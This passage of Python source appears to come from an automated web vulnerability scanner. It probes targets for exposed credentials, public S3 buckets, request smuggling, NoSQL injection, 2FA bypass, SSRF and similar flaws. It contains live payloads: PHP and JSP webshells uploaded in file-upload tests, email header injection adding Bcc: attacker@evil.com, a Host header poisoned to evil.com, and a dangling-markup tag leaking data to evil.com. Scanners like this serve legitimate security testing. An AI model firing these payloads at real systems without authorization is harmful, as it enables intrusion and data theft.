    for path in ["/aws.json", "/credentials", "/.aws/credentials", "/s3.json",
                 "/cloud-config.json", "/gcp-credentials.json"]:
        try:
            r = _S.get(f"{base}{path}", timeout=5)
            if r.status_code == 200 and any(x in r.text for x in ["AKIA", "aws_access", "private_key"]):
                findings.append({"type": "Cloud Credentials Exposed", "severity": "critical",
                                 "url": f"{base}{path}", "detail": "Cloud credentials file accessible",
                                 "template": "apex-cloud"})
        except: pass

    # API versioning — test old versions
    for target in web_targets[:3]:
        for old_ver in ["/api/v0/", "/api/v1/", "/api/v2/", "/api/beta/", "/api/legacy/"]:
            try:
                r = _S.get(f"{target}{old_ver}users", timeout=5)
                if r.status_code == 200:
                    try:
                        data = r.json()
                        if isinstance(data, list) and len(data) > 0:
                            findings.append({"type": f"Old API Version: {old_ver}users", "severity": "high",
                                             "url": f"{target}{old_ver}users",
                                             "detail": f"Old API returns {len(data)} users without auth",
                                             "template": "apex-api-ver"})
                    except: pass
            except: pass

    return findings


# ---------------------------------------------------------------------------
# S3 bucket enum, HTTP smuggling detection, email injection, DNS rebinding
# ---------------------------------------------------------------------------

def scan_s3_buckets(target, subdomains):
    """Find misconfigured S3 buckets related to the target."""
    findings = []
    import re as _re
    domain = target.replace("www.", "").split(".")[0]
    bucket_names = [
        domain, f"{domain}-backup", f"{domain}-dev", f"{domain}-staging",
        f"{domain}-prod", f"{domain}-assets", f"{domain}-static", f"{domain}-media",
        f"{domain}-uploads", f"{domain}-files", f"{domain}-data", f"{domain}-logs",
        f"{domain}-test", f"{domain}-internal", f"{domain}-public", f"{domain}-private",
    ]
    for sub in subdomains[:20]:
        parts = sub.split(".")
        if len(parts) > 2:
            bucket_names.append(parts[0])

    for bucket in bucket_names:
        for region in ["", ".s3.amazonaws.com", ".s3-us-east-1.amazonaws.com",
                       ".s3-eu-west-1.amazonaws.com", ".s3-ap-southeast-1.amazonaws.com"]:
            url = f"https://{bucket}{region}" if region else f"https://{bucket}.s3.amazonaws.com"
            try:
                r = requests.get(url, timeout=5, verify=False)
                if r.status_code == 200 and "<ListBucketResult" in r.text:
                    # Verify bucket content relates to target domain (avoid false positives)
                    content_sample = r.text[:5000].lower()
                    target_domain = target.replace("www.", "").split(".")[0].lower()
                    # Check if bucket name or content references the target
                    if target_domain in bucket or target_domain in content_sample or target in content_sample:
                        files = len(_re.findall(r"<Key>", r.text))
                        findings.append({"type": "Public S3 Bucket", "severity": "critical",
                                         "url": url, "detail": f"Bucket {bucket} is public — {files} files listed",
                                         "template": "apex-s3"})
                        break
                    # Generic public bucket not related to target - skip
                    break
                elif r.status_code == 403:
                    findings.append({"type": "S3 Bucket Exists (Private)", "severity": "low",
                                     "url": url, "detail": f"Bucket {bucket} exists but is private",
                                     "template": "apex-s3"})
                    break
            except: continue
    return findings


def scan_request_smuggling(web_targets):
    """Detect HTTP request smuggling vulnerabilities."""
    findings = []
    for target in web_targets[:5]:
        try:
            # CL.TE probe
            import socket, ssl
            parsed = urllib.parse.urlparse(target)
            host = parsed.netloc
            port = 443 if parsed.scheme == "https" else 80
            path = parsed.path or "/"

            payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 6\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"0\r\n"
                f"\r\n"
                f"G"
            ).encode()

            sock = socket.create_connection((host.split(":")[0], port), timeout=5)
            if port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host.split(":")[0])
            sock.send(payload)
            resp = sock.recv(4096).decode("utf-8", errors="ignore")
            sock.close()

            if "400" in resp[:50] and "Bad Request" in resp:
                pass  # Normal
            elif "200" in resp[:50] or "timeout" in resp.lower():
                findings.append({"type": "Possible HTTP Request Smuggling (CL.TE)", "severity": "critical",
                                 "url": target, "detail": "Server may be vulnerable to request smuggling",
                                 "template": "apex-smuggling"})
        except: pass
    return findings


def scan_email_injection(crawl_data):
    """Test contact/email forms for header injection."""
    findings = []
    inject_payloads = [
        "test@test.com\nBcc: attacker@evil.com",
        "test@test.com\r\nBcc: attacker@evil.com",
        "test@test.com%0ABcc:attacker@evil.com",
        "test@test.com%0D%0ABcc:attacker@evil.com",
    ]
    for form in crawl_data.get("forms", []):
        if form.get("method", "").upper() != "POST": continue
        inputs = form.get("inputs", [])
        email_inputs = [i for i in inputs if "email" in i.get("name", "").lower() or
                       i.get("type", "") == "email"]
        if not email_inputs: continue
        action = form.get("action", "")
        if not action: continue
        for payload in inject_payloads[:2]:
            try:
                data = {i.get("name", "field"): i.get("value", "test") for i in inputs}
                for ei in email_inputs:
                    data[ei["name"]] = payload
                r = _S.post(action, data=data, timeout=5)
                if r.status_code in (200, 302) and "error" not in r.text.lower():
                    findings.append({"type": "Email Header Injection", "severity": "medium",
                                     "url": action, "detail": f"Email form may be injectable",
                                     "template": "apex-email"})
                    break
            except: continue
    return findings


def scan_open_ports_web(subdomains):
    """Find web services on non-standard ports — often less secured."""
    findings = []
    ports = [8080, 8443, 8000, 8888, 9090, 3000, 4000, 5000, 7443, 9443, 8081, 8082, 4443, 10000]
    for sub in subdomains[:10]:
        for port in ports:
            try:
                proto = "https" if port in (8443, 7443, 9443, 4443) else "http"
                r = _S.get(f"{proto}://{sub}:{port}", timeout=3)
                if r.status_code < 400:
                    title = ""
                    try:
                        from bs4 import BeautifulSoup as BS
                        title = BS(r.text, "lxml").title.string[:50] if BS(r.text, "lxml").title else ""
                    except: pass
                    findings.append({"type": f"Web Service on Port {port}", "severity": "medium",
                                     "url": f"{proto}://{sub}:{port}",
                                     "detail": f"Service running: {title or r.status_code}",
                                     "template": "apex-ports"})
            except: continue
    return findings


# ---------------------------------------------------------------------------
# DNS zone transfer, cert transparency, API fuzzing, 2FA bypass
# ---------------------------------------------------------------------------

def scan_dns_zone_transfer(target):
    """Attempt DNS zone transfer — reveals all subdomains at once."""
    findings = []
    try:
        import subprocess
        # Get nameservers
        ns_result = subprocess.run(["dig", "+short", "NS", target], capture_output=True, text=True, timeout=10)
        nameservers = [ns.rstrip(".") for ns in ns_result.stdout.splitlines() if ns.strip()]
        for ns in nameservers[:3]:
            result = subprocess.run(["dig", "AXFR", target, f"@{ns}"], capture_output=True, text=True, timeout=10)
            if "Transfer failed" not in result.stdout and len(result.stdout) > 200:
                lines = [l for l in result.stdout.splitlines() if l and not l.startswith(";")]
                if len(lines) > 5:
                    findings.append({"type": "DNS Zone Transfer Allowed", "severity": "critical",
                                     "url": f"dns://{target}", "detail": f"NS {ns} allows AXFR — {len(lines)} records exposed",
                                     "template": "apex-dns"})
    except: pass
    return findings


def get_cert_transparency_subdomains(target):
    """Get subdomains from certificate transparency logs — finds hidden subdomains."""
    subdomains = set()
    try:
        r = requests.get(f"https://crt.sh/?q=%.{target}&output=json", timeout=15)
        for entry in r.json():
            name = entry.get("name_value", "")
            for sub in name.split("\n"):
                sub = sub.strip().lstrip("*.")
                if sub.endswith(f".{target}") or sub == target:
                    subdomains.add(sub)
    except: pass
    try:
        r = requests.get(f"https://api.certspotter.com/v1/issuances?domain={target}&include_subdomains=true&expand=dns_names", timeout=15)
        for cert in r.json():
            for name in cert.get("dns_names", []):
                name = name.lstrip("*.")
                if name.endswith(f".{target}"):
                    subdomains.add(name)
    except: pass
    return list(subdomains)


def scan_api_fuzzing(web_targets):
    """Fuzz API endpoints with common wordlist."""
    findings = []
    api_words = [
        "users", "user", "admin", "accounts", "account", "profile", "profiles",
        "config", "configuration", "settings", "debug", "test", "internal",
        "private", "secret", "token", "tokens", "keys", "key", "auth", "login",
        "logout", "register", "signup", "password", "reset", "forgot",
        "export", "import", "backup", "dump", "logs", "log", "metrics",
        "health", "status", "info", "version", "env", "environment",
        "graphql", "swagger", "api-docs", "openapi", "schema",
        "upload", "uploads", "files", "file", "download", "media",
        "payment", "payments", "billing", "invoice", "order", "orders",
        "webhook", "webhooks", "callback", "notify", "notification",
        "search", "query", "report", "reports", "analytics", "stats",
        "employee", "employees", "staff", "customer", "customers",
        "v1", "v2", "v3", "beta", "alpha", "legacy", "old", "new",
    ]
    for target in web_targets[:3]:
        for prefix in ["/api/", "/api/v1/", "/api/v2/", "/"]:
            for word in api_words:
                url = f"{target}{prefix}{word}"
                try:
                    r = _S.get(url, timeout=3, allow_redirects=False)
                    if r.status_code == 200:
                        ctype = r.headers.get("content-type", "").lower()
                        if "json" in ctype:
                            try:
                                data = r.json()
                                if isinstance(data, (list, dict)) and len(str(data)) > 30:
                                    has_sensitive = any(k in str(data).lower() for k in
                                                      ["email", "password", "token", "secret", "ssn", "credit", "phone"])
                                    sev = "critical" if has_sensitive else "medium"
                                    findings.append({"type": f"Unprotected API: {prefix}{word}", "severity": sev,
                                                     "url": url, "detail": f"Returns JSON ({len(str(data))}b)",
                                                     "template": "apex-apifuzz"})
                            except: pass
                except: continue
    return findings


def scan_2fa_bypass(crawl_data):
    """Test for 2FA/OTP bypass techniques."""
    findings = []
    for page in crawl_data.get("pages", [])[:5]:
        url = page["url"]
        if any(x in url.lower() for x in ["2fa", "otp", "verify", "mfa", "totp", "code"]):
            base = "/".join(url.split("/", 3)[:3])
            # Test null/empty OTP
            for payload in [{"code": ""}, {"code": "000000"}, {"code": "null"}, {"otp": ""}, {"token": ""}]:
                try:
                    r = _S.post(url, json=payload, timeout=5)
                    if r.status_code == 200 and "invalid" not in r.text.lower() and "error" not in r.text.lower():
                        findings.append({"type": "Possible 2FA Bypass", "severity": "critical",
                                         "url": url, "detail": f"Empty/null OTP accepted: {payload}",
                                         "template": "apex-2fa"})
                        break
                except: continue
    return findings


def scan_insecure_deserialization(crawl_data):
    """Detect potential deserialization endpoints."""
    findings = []
    deser_signatures = [
        b"\xac\xed\x00\x05",  # Java serialized object
        b"O:4:",               # PHP serialized object
        b"rO0AB",              # Java base64 serialized
    ]
    for page in crawl_data.get("pages", []):
        try:
            r = _S.get(page["url"], timeout=5)
            # Check cookies for serialized data
            for name, val in r.cookies.items():
                import base64
                try:
                    decoded = base64.b64decode(val + "==")
                    for sig in deser_signatures:
                        if decoded.startswith(sig):
                            findings.append({"type": "Serialized Object in Cookie", "severity": "high",
                                             "url": page["url"], "detail": f"Cookie {name} contains serialized data",
                                             "template": "apex-deser"})
                except: pass
            # Check response body
            for sig in deser_signatures:
                if sig in r.content:
                    findings.append({"type": "Serialized Object in Response", "severity": "high",
                                     "url": page["url"], "detail": "Response contains serialized object",
                                     "template": "apex-deser"})
        except: pass
    return findings


# ---------------------------------------------------------------------------
# Missing vulnerability scanners — completing the full list
# ---------------------------------------------------------------------------

def scan_nosql_injection(crawl_data):
    """Test for NoSQL injection (MongoDB, etc.)."""
    findings = []
    payloads = [
        {"$gt": ""},
        {"$ne": "invalid"},
        {"$where": "1==1"},
        {"$regex": ".*"},
    ]
    for form in crawl_data.get("forms", []):
        if form.get("method", "").upper() != "POST": continue
        action = form.get("action", "")
        if not action: continue
        for payload in payloads:
            try:
                data = {i.get("name","f"): payload for i in form.get("inputs",[]) if i.get("type") not in ("submit","hidden")}
                r = _S.post(action, json=data, timeout=5, headers={"Content-Type":"application/json"})
                if r.status_code == 200 and any(x in r.text.lower() for x in ["welcome","dashboard","logged","token","success"]):
                    findings.append({"type":"NoSQL Injection","severity":"critical","url":action,
                                     "detail":f"NoSQL operator {list(payload.keys())[0]} bypassed auth","template":"apex-nosql"})
                    break
            except: continue
    for url, params in crawl_data.get("params",{}).items():
        for p in params:
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = ["[$ne]=invalid"]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs,doseq=True)).geturl()
                r = _S.get(test_url, timeout=5)
                if r.status_code == 200 and len(r.content) > 100:
                    findings.append({"type":"NoSQL Injection (GET)","severity":"high","url":test_url,
                                     "detail":f"NoSQL operator in param {p}","template":"apex-nosql"})
            except: continue
    return findings


def scan_mass_assignment(crawl_data):
    """Test for mass assignment / auto-binding vulnerabilities."""
    findings = []
    extra_fields = ["role","admin","is_admin","isAdmin","superuser","privilege","level",
                    "verified","active","status","permissions","group","type","plan"]
    for form in crawl_data.get("forms",[]):
        if form.get("method","").upper() != "POST": continue
        action = form.get("action","")
        if not action: continue
        try:
            data = {i.get("name","f"): i.get("value","test") for i in form.get("inputs",[]) if i.get("name")}
            baseline = _S.post(action, data=data, timeout=5)
            for field in extra_fields:
                data[field] = "true"
                r = _S.post(action, data=data, timeout=5)
                if r.status_code == 200 and r.text != baseline.text:
                    findings.append({"type":f"Mass Assignment: {field}","severity":"high","url":action,
                                     "detail":f"Extra field {field}=true changes response","template":"apex-mass"})
                    break
                del data[field]
        except: continue
    return findings


def scan_file_upload(crawl_data):
    """Test file upload endpoints for unrestricted upload."""
    findings = []
    webshell_php = b"<?php echo shell_exec($_GET['cmd']); ?>"
    webshell_jsp = b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
    for form in crawl_data.get("forms",[]):
        inputs = form.get("inputs",[])
        file_inputs = [i for i in inputs if i.get("type") == "file"]
        if not file_inputs: continue
        action = form.get("action","")
        if not action: continue
        for fname, content, ctype in [
            ("shell.php", webshell_php, "application/x-php"),
            ("shell.php.jpg", webshell_php, "image/jpeg"),
            ("shell.phtml", webshell_php, "text/html"),
            ("shell.php%00.jpg", webshell_php, "image/jpeg"),
        ]:
            try:
                files = {file_inputs[0].get("name","file"): (fname, content, ctype)}
                r = _S.post(action, files=files, timeout=5)
                if r.status_code in (200,201):
                    # Check if file was uploaded and accessible
                    urls_in_resp = re.findall(r'https?://[^\s\'"<>]+' + fname.split(".")[0], r.text)
                    if urls_in_resp or fname.split(".")[0] in r.text:
                        findings.append({"type":"Unrestricted File Upload","severity":"critical","url":action,
                                         "detail":f"Uploaded {fname} accepted","template":"apex-upload"})
                        break
            except: continue
    return findings


def scan_csrf(crawl_data):
    """Check for missing CSRF protection on state-changing forms."""
    findings = []
    for form in crawl_data.get("forms",[]):
        if form.get("method","").upper() != "POST": continue
        inputs = form.get("inputs",[])
        has_csrf = any(i.get("name","").lower() in ("csrf","_token","csrftoken","csrf_token",
                       "authenticity_token","__requestverificationtoken","_csrf") for i in inputs)
        action = form.get("action","")
        if not has_csrf and action:
            findings.append({"type":"Missing CSRF Token","severity":"medium","url":action,
                             "detail":"POST form has no CSRF token","template":"apex-csrf"})
    return findings


def scan_clickjacking(crawl_data):
    """Check for clickjacking vulnerability (missing X-Frame-Options / CSP frame-ancestors)."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:5]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            r = _S.get(page["url"], timeout=5)
            xfo = r.headers.get("X-Frame-Options","")
            csp = r.headers.get("Content-Security-Policy","")
            if not xfo and "frame-ancestors" not in csp:
                findings.append({"type":"Clickjacking (Missing X-Frame-Options)","severity":"medium",
                                 "url":page["url"],"detail":"No X-Frame-Options or CSP frame-ancestors",
                                 "template":"apex-clickjack"})
        except: pass
    return findings


def scan_cookie_security(crawl_data):
    """Check for insecure cookie flags."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:5]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            r = _S.get(page["url"], timeout=5)
            for name, cookie in r.cookies.items():
                issues = []
                raw = r.headers.get("Set-Cookie","")
                if name.lower() in ("session","sessionid","auth","token","jwt","sid","phpsessid","jsessionid"):
                    if "httponly" not in raw.lower(): issues.append("Missing HttpOnly")
                    if "secure" not in raw.lower() and page["url"].startswith("https"): issues.append("Missing Secure")
                    if "samesite" not in raw.lower(): issues.append("Missing SameSite")
                    if issues:
                        findings.append({"type":f"Insecure Cookie: {name}","severity":"medium",
                                         "url":page["url"],"detail":", ".join(issues),"template":"apex-cookie"})
        except: pass
    return findings


def scan_account_enumeration(crawl_data):
    """Test for account/user enumeration via login/reset forms."""
    findings = []
    for page in crawl_data.get("pages",[]):
        url = page["url"]
        if not any(x in url.lower() for x in ["login","signin","forgot","reset","register"]): continue
        base = "/".join(url.split("/",3)[:3])
        for path in ["/login","/api/login","/forgot-password","/api/forgot-password","/reset"]:
            try:
                r_exist = _S.post(f"{base}{path}", json={"email":"admin@admin.com","password":"wrong"}, timeout=5)
                r_noexist = _S.post(f"{base}{path}", json={"email":"nonexistent_xyz_12345@test.com","password":"wrong"}, timeout=5)
                if r_exist.status_code == r_noexist.status_code:
                    if abs(len(r_exist.text) - len(r_noexist.text)) > 20:
                        findings.append({"type":"User Enumeration","severity":"medium","url":f"{base}{path}",
                                         "detail":"Different response length for valid vs invalid user",
                                         "template":"apex-enum"})
                elif r_exist.status_code != r_noexist.status_code:
                    findings.append({"type":"User Enumeration (Status Code)","severity":"medium","url":f"{base}{path}",
                                     "detail":f"Valid user: {r_exist.status_code}, Invalid: {r_noexist.status_code}",
                                     "template":"apex-enum"})
            except: continue
    return findings


def scan_password_reset_poisoning(crawl_data):
    """Test for password reset link poisoning via Host header."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[]):
        if not any(x in page["url"].lower() for x in ["forgot","reset","password"]): continue
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/forgot-password","/api/forgot-password","/password/reset","/auth/forgot"]:
            try:
                r = _S.post(f"{base}{path}",
                           json={"email":"test@test.com"},
                           headers={"Host":"evil.com","X-Forwarded-Host":"evil.com"},
                           timeout=5)
                if r.status_code in (200,202):
                    findings.append({"type":"Password Reset Poisoning","severity":"high","url":f"{base}{path}",
                                     "detail":"Reset endpoint accepts poisoned Host header",
                                     "template":"apex-pwreset"})
            except: continue
    return findings


def scan_http_verb_tampering(web_targets):
    """Test for HTTP verb tampering — bypass auth with unusual methods."""
    findings = []
    for target in web_targets[:3]:
        for path in ["/admin","/api/admin","/internal","/api/users"]:
            url = f"{target}{path}"
            try:
                get_r = _S.get(url, timeout=5)
                if get_r.status_code == 403:
                    for method in ["HEAD","OPTIONS","TRACE","PUT","PATCH","DELETE","CONNECT","ARBITRARY"]:
                        try:
                            r = _S.request(method, url, timeout=5)
                            if r.status_code == 200:
                                findings.append({"type":f"HTTP Verb Tampering: {method}","severity":"high",
                                                 "url":url,"detail":f"{method} bypasses 403 on {path}",
                                                 "template":"apex-verb"})
                                break
                        except: continue
            except: continue
    return findings


def scan_log_injection(crawl_data):
    """Test for log injection via user-controlled input."""
    findings = []
    payload = "test\n[CRITICAL] Admin login from 1.2.3.4 - password: admin123"
    for url, params in crawl_data.get("params",{}).items():
        for p in params:
            if any(x in p.lower() for x in ["user","name","email","log","msg","message","comment","note"]):
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs,doseq=True)).geturl()
                    r = _S.get(test_url, timeout=5)
                    if r.status_code == 200:
                        findings.append({"type":"Log Injection","severity":"medium","url":test_url,
                                         "detail":f"Newline in param {p} may inject log entries",
                                         "template":"apex-log"})
                        break
                except: continue
    return findings


# ---------------------------------------------------------------------------
# Advanced: XS-Leaks, ReDoS, Source Maps, postMessage, WebRTC, SSRF chains
# ---------------------------------------------------------------------------

def scan_source_map_exposure(web_targets):
    """Find exposed JavaScript source maps — reveals original source code."""
    findings = []
    for target in web_targets[:5]:
        try:
            r = _S.get(target, timeout=5)
            soup = BeautifulSoup(r.text, "lxml")
            for script in soup.find_all("script", src=True):
                src = script["src"]
                if not src.startswith("http"):
                    base = "/".join(target.split("/", 3)[:3])
                    src = base + src if src.startswith("/") else base + "/" + src
                map_url = src + ".map"
                try:
                    rm = _S.get(map_url, timeout=5)
                    if rm.status_code == 200 and "sources" in rm.text and "mappings" in rm.text:
                        findings.append({"type": "Source Map Exposed", "severity": "medium",
                                         "url": map_url, "detail": "JS source map reveals original source code",
                                         "template": "apex-sourcemap"})
                except: pass
        except: pass
    return findings


def scan_redos(crawl_data):
    """Test for ReDoS (Regular Expression Denial of Service)."""
    findings = []
    # Payloads that trigger catastrophic backtracking
    redos_payloads = [
        "a" * 50 + "!",
        "(" * 20 + "a" * 20 + ")" * 20,
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
        "1" * 100 + "@" + "1" * 100 + ".com",
    ]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if any(x in p.lower() for x in ["email", "phone", "zip", "postal", "regex", "pattern", "search", "query"]):
                for payload in redos_payloads[:2]:
                    try:
                        parsed = urllib.parse.urlparse(url)
                        qs = urllib.parse.parse_qs(parsed.query)
                        qs[p] = [payload]
                        test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                        start = time.time()
                        r = _S.get(test_url, timeout=10)
                        elapsed = time.time() - start
                        if elapsed > 3:
                            findings.append({"type": "ReDoS (Regex DoS)", "severity": "medium",
                                             "url": test_url, "detail": f"Response took {elapsed:.1f}s with ReDoS payload in {p}",
                                             "template": "apex-redos"})
                            break
                    except: continue
    return findings


def scan_hsts(crawl_data):
    """Check for HSTS misconfiguration."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested or not base.startswith("https"): continue
        tested.add(base)
        try:
            r = _S.get(page["url"], timeout=5)
            hsts = r.headers.get("Strict-Transport-Security", "")
            if not hsts:
                findings.append({"type": "Missing HSTS", "severity": "medium", "url": page["url"],
                                 "detail": "No Strict-Transport-Security header on HTTPS site",
                                 "template": "apex-hsts"})
            elif "max-age=0" in hsts:
                findings.append({"type": "HSTS Disabled (max-age=0)", "severity": "medium",
                                 "url": page["url"], "detail": "HSTS explicitly disabled", "template": "apex-hsts"})
            elif "includeSubDomains" not in hsts:
                findings.append({"type": "HSTS Missing includeSubDomains", "severity": "low",
                                 "url": page["url"], "detail": "HSTS doesn't cover subdomains", "template": "apex-hsts"})
        except: pass
    return findings


def scan_dangling_markup(crawl_data):
    """Test for dangling markup injection — exfiltrate data via HTML injection."""
    findings = []
    payload = '<img src="https://evil.com/?data='
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = [payload]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                r = _S.get(test_url, timeout=5)
                if payload.split('"')[0] in r.text and "<script" not in r.text.lower():
                    findings.append({"type": "Dangling Markup Injection", "severity": "medium",
                                     "url": test_url, "detail": f"HTML injected without script execution via {p}",
                                     "template": "apex-dangling"})
                    break
            except: continue
    return findings


def scan_css_injection(crawl_data):
    """Test for CSS injection — can exfiltrate data via attribute selectors."""
    findings = []
    payload = "}</style><style>*{color:red}"
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if any(x in p.lower() for x in ["style", "css", "theme", "color", "class", "skin"]):
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=5)
                    if "color:red" in r.text and payload[:5] in r.text:
                        findings.append({"type": "CSS Injection", "severity": "medium",
                                         "url": test_url, "detail": f"CSS injected via param {p}",
                                         "template": "apex-css"})
                        break
                except: continue
    return findings


def scan_postmessage_abuse(crawl_data):
    """Find postMessage handlers without origin validation."""
    findings = []
    for page in crawl_data.get("pages", [])[:10]:
        try:
            r = _S.get(page["url"], timeout=5)
            js = r.text
            # Find postMessage listeners without origin check
            listeners = re.findall(r'addEventListener\s*\(\s*["\']message["\']', js)
            if listeners:
                # Check if origin is validated
                has_origin_check = bool(re.search(r'event\.origin|message\.origin|e\.origin', js))
                if not has_origin_check:
                    findings.append({"type": "postMessage Without Origin Check", "severity": "medium",
                                     "url": page["url"], "detail": f"{len(listeners)} message listener(s) without origin validation",
                                     "template": "apex-postmsg"})
        except: pass
    return findings


def scan_mime_sniffing(crawl_data):
    """Check for MIME sniffing vulnerability (missing X-Content-Type-Options)."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            r = _S.get(page["url"], timeout=5)
            if not r.headers.get("X-Content-Type-Options"):
                findings.append({"type": "Missing X-Content-Type-Options", "severity": "low",
                                 "url": page["url"], "detail": "MIME sniffing not prevented",
                                 "template": "apex-mime"})
        except: pass
    return findings


def scan_null_byte(crawl_data):
    """Test for null byte injection in file-related parameters."""
    findings = []
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if any(x in p.lower() for x in ["file", "path", "dir", "name", "page", "template", "include", "load"]):
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = ["../../../etc/passwd%00.jpg"]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=5)
                    if "root:" in r.text or "daemon:" in r.text:
                        findings.append({"type": "Null Byte Injection + LFI", "severity": "critical",
                                         "url": test_url, "detail": f"Null byte bypass in param {p}",
                                         "template": "apex-nullbyte"})
                except: continue
    return findings


def scan_ssrf_via_upload(crawl_data):
    """Test SSRF via file upload URL fields and image processing."""
    findings = []
    ssrf_urls = ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22",
                 "http://localhost/admin", "http://[::1]/"]
    for form in crawl_data.get("forms", []):
        inputs = form.get("inputs", [])
        url_inputs = [i for i in inputs if any(x in i.get("name", "").lower()
                      for x in ["url", "link", "src", "source", "image", "avatar", "photo", "fetch", "import"])]
        if not url_inputs: continue
        action = form.get("action", "")
        if not action: continue
        for ssrf_url in ssrf_urls[:2]:
            try:
                data = {i.get("name", "f"): i.get("value", "test") for i in inputs}
                for ui in url_inputs:
                    data[ui["name"]] = ssrf_url
                r = _S.post(action, data=data, timeout=5)
                if any(x in r.text for x in ["ami-id", "instance-id", "ssh-", "root:", "OpenSSH"]):
                    findings.append({"type": "SSRF via URL Input", "severity": "critical",
                                     "url": action, "detail": f"SSRF via {url_inputs[0]['name']} field",
                                     "template": "apex-ssrf-upload"})
                    break
            except: continue
    return findings


# ---------------------------------------------------------------------------
# Automatable: IP spoofing headers, hop-by-hop, robots/sitemap, staging,
# cloud metadata variants, signed URLs, IP bypass, X-Forwarded-For abuse
# ---------------------------------------------------------------------------

def scan_ip_header_spoofing(web_targets):
    """Test if IP-based access controls can be bypassed via headers."""
    findings = []
    spoof_headers = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-For": "::1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"True-Client-IP": "127.0.0.1"},
        {"Client-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"Forwarded": "for=127.0.0.1"},
        {"X-Forwarded-For": "10.0.0.1"},
        {"X-Forwarded-For": "192.168.1.1"},
    ]
    for target in web_targets[:3]:
        for path in ["/admin", "/internal", "/api/admin", "/management", "/debug"]:
            url = f"{target}{path}"
            try:
                baseline = _S.get(url, timeout=5)
                if baseline.status_code != 403: continue
                for headers in spoof_headers:
                    r = _S.get(url, timeout=5, headers=headers)
                    if r.status_code == 200:
                        findings.append({"type": f"IP Spoofing Bypass: {list(headers.keys())[0]}",
                                         "severity": "critical", "url": url,
                                         "detail": f"{list(headers.keys())[0]}: 127.0.0.1 bypasses 403",
                                         "template": "apex-ipspoof"})
                        break
            except: continue
    return findings


def scan_hop_by_hop(web_targets):
    """Test hop-by-hop header abuse to strip security headers."""
    findings = []
    for target in web_targets[:3]:
        try:
            # Request that proxy strips Authorization header
            r = _S.get(target, timeout=5, headers={
                "Connection": "close, X-Custom-Header",
                "X-Custom-Header": "test",
                "Transfer-Encoding": "chunked",
            })
            # Check if security headers were stripped
            if not r.headers.get("X-Frame-Options") and not r.headers.get("Content-Security-Policy"):
                findings.append({"type": "Hop-by-Hop Header Abuse", "severity": "low",
                                 "url": target, "detail": "Security headers may be stripped by proxy",
                                 "template": "apex-hopbyhop"})
        except: pass
    return findings


def scan_robots_sitemap(target):
    """Extract sensitive paths from robots.txt and sitemap.xml."""
    findings = []
    base = f"https://{target}"
    for url in [f"{base}/robots.txt", f"http://{target}/robots.txt"]:
        try:
            r = _S.get(url, timeout=5)
            if r.status_code == 200 and ("Disallow" in r.text or "Allow" in r.text):
                disallowed = re.findall(r"Disallow:\s*(/[^\s]+)", r.text)
                sensitive = [p for p in disallowed if any(x in p.lower() for x in
                             ["admin", "api", "internal", "private", "secret", "backup",
                              "config", "debug", "test", "staging", "dev", "login"])]
                if sensitive:
                    findings.append({"type": "Robots.txt Sensitive Paths", "severity": "low",
                                     "url": url, "detail": f"Sensitive disallowed paths: {', '.join(sensitive[:5])}",
                                     "template": "apex-robots"})
                # Test if disallowed paths are actually accessible
                for path in disallowed[:10]:
                    try:
                        rp = _S.get(f"{base}{path}", timeout=3)
                        if rp.status_code == 200 and len(rp.content) > 100:
                            findings.append({"type": f"Robots.txt Path Accessible: {path}",
                                             "severity": "medium", "url": f"{base}{path}",
                                             "detail": "Disallowed path is publicly accessible",
                                             "template": "apex-robots"})
                    except: pass
        except: pass
    # Sitemap
    for url in [f"{base}/sitemap.xml", f"{base}/sitemap_index.xml"]:
        try:
            r = _S.get(url, timeout=5)
            if r.status_code == 200 and "<url>" in r.text:
                urls = re.findall(r"<loc>([^<]+)</loc>", r.text)
                sensitive = [u for u in urls if any(x in u.lower() for x in
